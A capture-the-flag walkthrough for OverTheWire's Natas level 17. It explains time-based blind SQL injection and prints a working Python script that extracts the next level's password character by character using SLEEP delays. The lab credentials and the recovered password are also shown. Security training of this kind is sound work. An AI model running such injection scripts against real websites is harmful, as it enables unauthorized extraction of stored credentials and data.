🔐 **Level 17**

When accessing the website, we are greeted with a message along with an input field to enter the username, just like the previous challenge:  
<img width="1920" height="548" alt="image" src="https://github.com/user-attachments/assets/45260d5b-7dd1-4d4b-9963-d31be8936e57" />

Checking the **source code** 📝:  
<img width="1132" height="691" alt="image" src="https://github.com/user-attachments/assets/b824465a-a372-4469-bfb6-20199537fe9c" />

Oh! This time, no matter what we input, nothing is displayed on the page like before. However, this is still a brute-force attack challenge.  
👉 Instead of relying on response messages, we now use **time-based SQL Injection** ⏳ to detect the correct characters.

I used the following Python code to brute-force:

```python
import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org"
auth = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

charset = string.ascii_letters + string.digits

password = ""

for i in range(1, 33):
    for char in charset:
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{i},1)="{char}", SLEEP(2), 0)-- a'
        start = time.time()
        response = requests.post(url, auth=auth, data={"username": payload})
        end = time.time() - start
        print(f'{end:.4f}{char}')
        if end >= 2:
            password += char
            print(f'Character {i} is {char}')
            break
        else:
            print(f'{char} is not character {i}')

print(f"[✅] Full password of natas17: {password}")

Here, the condition relies on execution time because the SLEEP(2) function delays the process if the guessed character is correct.

And the result was:
<img width="728" height="268" alt="image" src="https://github.com/user-attachments/assets/492b003c-6621-48df-95f3-da90fc736581" />

✨ Password revealed:


 ```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

```
